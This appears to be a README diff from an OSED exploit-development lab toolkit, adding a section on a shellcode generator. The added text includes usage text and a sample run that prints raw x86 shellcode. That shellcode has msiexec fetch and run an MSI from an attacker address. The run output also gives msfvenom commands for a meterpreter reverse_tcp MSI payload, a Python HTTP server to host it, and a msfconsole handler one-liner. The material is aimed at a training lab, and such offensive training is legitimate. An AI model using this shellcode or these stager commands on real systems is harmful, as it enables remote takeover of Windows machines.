@@ -57,6 +57,53 @@ egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x
 
 ```
 
+### shellcoder.py
+
+Creates reverse shell with optional msi loader
+
+```
+usage: shellcode.py [-h] [-l LHOST] [-p LPORT] [-b BAD_CHARS [BAD_CHARS ...]] [-m] [-d] [-t] [-s]
+
+Creates shellcodes compatible with the OSED lab VM
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -l LHOST, --lhost LHOST
+                        listening attacker system (default: 127.0.0.1)
+  -p LPORT, --lport LPORT
+                        listening port of the attacker system (default: 4444)
+  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
+                        space separated list of bad chars to check for in final egghunter (default: 00)
+  -m, --msi             use an msf msi exploit stager (short)
+  -d, --debug-break     add a software breakpoint as the first shellcode instruction
+  -t, --test-shellcode  test the shellcode on the system
+  -s, --store-shellcode
+                        store the shellcode in binary format in the file shellcode.bin
+```
+
+```
+❯ python3 shellcode.py --msi -l 192.168.49.88 -s
+[+] shellcode created! 
+[=]   len:   251 bytes                                                                                            
+[=]   lhost: 192.168.49.88
+[=]   lport: 4444                                                                                                                                                                                                                    
+[=]   break: breakpoint disabled                                                                                                                                                                                                     
+[=]   ver:   MSI stager
+[=]   Shellcode stored in: shellcode.bin
+[=]   help:
+         Create msi payload:
+                 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.88 LPORT=443 -f msi -o X
+         Start http server (hosting the msi file):
+                 sudo python -m SimpleHTTPServer 4444 
+         Start the metasploit listener:
+                 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.49.88; set LPORT 443; exploit"
+         Remove bad chars with msfvenom (use --store-shellcode flag): 
+                 cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode
+
+shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x71\x6e\x50\x68\x2f\x58\x20\x2f\x68\x34\x34\x34\x34\x68\x2e\x36\x34\x3a\x68\x38\x2e\x34\x39\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"           
+****
+```
+
 ### install-mona.sh
 
 downloads all components necessary to install mona and prompts you to use an admin shell on the windows box to finish installation.
